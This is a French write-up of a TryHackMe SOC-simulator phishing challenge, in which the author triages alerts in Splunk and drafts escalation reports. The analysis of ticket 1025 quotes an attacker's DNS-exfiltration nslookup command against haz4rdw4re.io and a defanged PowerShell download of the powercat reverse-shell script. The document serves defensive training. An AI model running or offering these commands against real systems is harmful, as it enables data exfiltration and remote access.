---
tags:
  - SOC_Simulator
  - TryHackMe
  - Phishing
---
## Contexte
De la même manière que [[Introduction to phishing]], ce challenge consiste en une simulation de SOC orienté menace Phishing.
![[THM_P-U.png]]
Nous allons donc avoir accès à une interface de ticketing classique, nous devrons les analyser (en utilisant des outils comme Splunk), puis répondre aux tickets en expliquant la situation, les impacts, les actions recommandées et décider si un passage au niveau 2 (pour plus d'analyse) est requis ou non.

Pour remplir les tickets, je vais utiliser le format suivant, le principe est d'être le plus synthétique possible pour faire gagner le plus de temps possible aux analystes SOC L2.

```
Who:

When:

Where:

What:

Why:

Impact:

IOCs:(hashes, domains, IP addresses, file names, etc)

Description:

Recommended actions:

Reason for Escalating the Alert:  
```

Je pourrais rajouter une partie : `Mitre technique` mais étant donné que ce challenge se concentre sur le phishing, ça ne serait pas très pertinent.

Aussi, il faut savoir que le challenge se termine lorsque tous les vrais positifs ont été trouvés. Ça veut donc dire que même s'il reste des tickets dans la file, le challenge est fini lorsque je trouve le dernier Vrai Positif.

Voici des données qui sont à notre disposition dans ce challenge.

Le contexte est le même que pour [[Introduction to phishing]], la seule différence ce sont les employés :
![[THM_P-U_employee.png]]
Et cette fois-ci, on n'a pas les IPs associées.

>[!warning] Attention
>Les plages horaires peuvent être incohérentes suivant les Tickets, j'ai eu un souci d'antivirus qui supprimait mes retex parce que je n'avais pas defang les IOCs...
>J'ai donc dû relancer la simulation pour récupérer certains screens à un autre moment.
## Tickets

### Ticket 1000
![[THM_P-U_T1000.png]]
Pour ce premier ticket, un email suspicieux a été reçu par un expéditeur externe avec un TLD inhabituel.
Mais apparemment, cette règle de détection pourrait avoir encore besoin d'un peu de réglage.

En recherchant l'adresse mail de l'expéditeur dans splunk on trouve le mail en question :
![[THM_P-U_T1000_Splunk.png]]
On ne trouve rien de plus. Ce qui veut donc dire qu'il n'y a pas eu de mail retour vers eileen. C'est donc juste un Vrai Positif, mais sans impact ni remonté en L2 nécessaire.
```
Who: support@tryhatme.com support

When:04/29/2026 19:42:43.075 

Where: email

What:eileen@trendymillineryco.me suspicious mail

Why: To obtain banking details, confidential information.

Impact: no impact, no data-loss and no response made by physhing 

IOCs: eileen@trendymillineryco.me, "Inheritance Alert: Unknown Billionaire Relative Left You Their Hat Fortunes"

Description:

"send us your banking details immediately", no attachment, classic Phishing so True positive
No “eileen” email as a recipient in splunk so the support didn't sent their banking details
So there is no need for escalation.

Recommended actions:
Delete the email and blacklist the IP and sender email.

```

### Ticket 1003
![[THM_P-U_T1003.png]]
Cette fois-ci c'est similaire au ticket T1000.
L'expéditeur : leonard@fashionindustrytrends.xyz et la cible, c'est yani.zubair@tryhatme.com du service IT, avec le pc win-3449.
Toujours pas de pièce jointe.
Ça promet de gagner une stratégie pour se faire un vrai empire juste en cliquant sur un lien… qu'ils ne donnent pas.
![[THM_P-U_T1003_Splunk.png]]
De la même façon que pour T1000, on retrouve le log dans Splunk mais rien d'autre, il n'y a donc pas eu d'intéractions autre que la réception du mail.
```
Who: Yani Zubair, yani.zubair@tryhatme.com, win-3449, IT department

When: 04/29/2026 19:47:49.075

Where: email

What:leonard@fashionindustrytrends.xyz phishing

Why: Offering compensation by entering a page and clicking something

Impact:no impact, no data-loss and no response made to physhing 

IOCs: yani.zubair@tryhatme.com, "Grow Your Hat Business Overnight with this Secret Formula"

Description:

Offering compensation by entering a page and clicking something, no attachment, classic Phishing/Spam so True positive
No “leonard” email as a recipient in splunk so yani didn't respond to them.
So there is no need for escalation.

Recommended actions:
Delete the email and blacklist the IP and sender email.
```

### Ticket 1025
![[THM_P-U_T1025.png]]
Cette fois-ci c'est un process qui s'est lancé avec un parent non commun sur le pc win-3450 (Michael Ascot, CEO, michael.ascot@tryhatme.com), le process, c'est `nslookup.exe` avec pid 5520 et le ppid 3728. Le dossier touché, c'est `C:\Users\michael.ascot\downloads\exfiltration\` via la commande : `"C:\Windows\system32\nslookup.exe" UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io`

C'est donc de sévérité Haute et demande élévation au niveau L2. C'est de l'exfiltration de données.
![[THM_P-U_T1025_Splunk.png]]
On cherchant l'identifiant de machine sur Splunk, on peut voir pleins d'exfiltration à ce moment.
Et en remontant encore plus loin dans le temps, on peut retrouver des traces de téléchargement via Powershell comme hxxps[://]raw[.]githubusercontent[.]com/besimorhino/powercat/master/powercat[.]ps1)
![[THM_P-U_T1015_Splunk2.png]]
On peut aussi voir des `whoami` et des `systeminfo` avoir été réalisé.
![[THM_P-U_T1025_Splunk3.png]]
Tout ça nous prouve que son compte l'attaquant a cherché des infos sur la machine et les privilèges de l'utilisateur compromis. On est donc plus que sûr que c'est un Vrai Positif.

Et on peut même trouver juste avant ces évènements un fichier Zip (ImportantInvoice-Febrary.zip) créé puis ouvert provenant d'un mail sur la boite mail du CEO.
Le fichier a été téléchargé dans le dossier `/downloads` avant que le dossier `/exfiltration` ne soit créé.
![[THM_P-U_T1025_Splunk4.png]]
Et le mail à l'origine de tout ça, c'est celui-là : 
![[THM_P-U_T1025_Mail.png]]
On y voit bien un phishing classique, où l'attaquant lui met la pression en lui disant qu'il n'avait pas payé une facture et que son compte allait être suspendu s'il ne payait pas dans les 24 heures. Avec en pièce jointe le .zip malicieux.
Zip qui d'ailleurs n'est pas considéré comme malicieux par TryDetectThis :
![[THM_P-U_T1025_TDT.png]]

```
Who: Michael Ascot, CEO, michael.ascot@tryhatme.com, win-3450

When: from 04/28/2026 19:49:04.146 but ticket at 20:14:27.146

Where: C:\Users\michael.ascot\downloads\exfiltration\

What: exifltration of datas to multiple encoded subdomain of haz4rdw4re.io

Why: Steal confidential informations.

Impact: data-loss, exfiltration, compromise account
IOCs: haz4rdw4re.io, \downloads\exfiltration\, ImportantInvoice-Febrary.zip, john@hatmakereurope.xyz, hxxps[://]raw[.]githubusercontent[.]com/besimorhino/powercat/master/powercat[.]ps1, 2[.]tcp[.]ngrok[.]io, whoami.exe, systeminfo.exe, robocopy.exe, nslookup.exe, md5: 332ffb18aa5c12126efd02388a6e

Description:

The CEO (win-3450) received a phishing containing an attachment named "ImportantInvoice-Febrary.zip" at 04/29/2026 19:52:51.075 from john@hatmakereurope.xyz with the subject "FINAL NOTICE: Overdue Payment - Account Suspension Imminent"
This CEO has unfortunately download the file at 04/29/2026 20:12:58.075
The file was created in the C:\Users\michael.ascot\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\UP4KOJQB\ImportantInvoice-Febrary.zip
Then the folder /downloads/exfiltration was created and some whoami and systeminfo was executed at 04/29/2026 20:13:26.075 and 04/29/2026 20:13:34.075

Then there are multiple registry modifications and other processes creations, including downloading external resources from the powershell.
such as hxxps[://]raw[.]githubusercontent[.]com/besimorhino/powercat/master/powercat[.]ps1
and multiple lookup to multiple encoded subdomains of haz4rdw4re.io like : "C:\Windows\system32\nslookup.exe" UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io

So obviously True Positive

Reason for Escalating the Alert:  
The attacker gained control of the win-3450 through PowerShell. The downloaded script allow remote command execution, lateral movement or data exfiltration.

Recommended actions:
1. Conduct a deep analysis of the network to identify additional compromise indicators.  
2. Disconnect win-3450 from the network to stop ongoing communication.  
3. Rotate the password for the CEO, set him to minimal right policy (no Powershell or even execution of some language)
4. Make the CEO participate in a formation about phishing.
5. BlackList the hash of the malicious zip

```

Les tickets liés au 1025 sont : 1005, 1020, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034.
### Ticket 1022 et 1024
![[THM_P-U_T1022.png]]
C'est encore un ticket lié au CEO (le pauvre, il en prend plein la poire).
Mais ça a l'air un peu plus spécifique que pour le 1025 puisque cette fois, c'est un disque qui a été mappé sur le stockage local de la machine du CEO, j'imagine que c'est pour mieux exfiltrer les données.
![[THM_P-U_T1024.png]]
Le 1024 est la suite logique parce que c'est le fait de le déconnecté de l'espace local de la machine.
![[THM_P-U_T1022_Splunk.png]]
On peut donc retrouver les logs dans Splunk : 
04/29/2026 20:16:16.075 -> CEO copie SSF-FinancialRecords sur un disque local
04/29/2026 20:17:14.075 -> ce disque local est déconnecté

On peut donc le lier aux tickets du 1025, mais en précisant pourquoi c'est lié.

At 04/29/2026 20:16:16.075, Michael Ascot copied the SSF-FinancialRecords file to a local drive, which was disconnected at 04/29/2026 20:17:14.075.
## Résultats
J'ai réussi à trouver tous les vrais positifs.
![[Phishing Unfolding.png]]
Par contre, j'ai perdu quelques points parce que j'ai fait un gros rapport copié collé pour tous les cas lié au 1025 a quelques détails prés. Mais je n'y ai pas ajouté les PID et PPID, de plus je n'ai pas fait mention des termes intégrité et confidentialité.
Je n'ai pas beaucoup explicité non plus certains IOC comme `robocopy.exe`.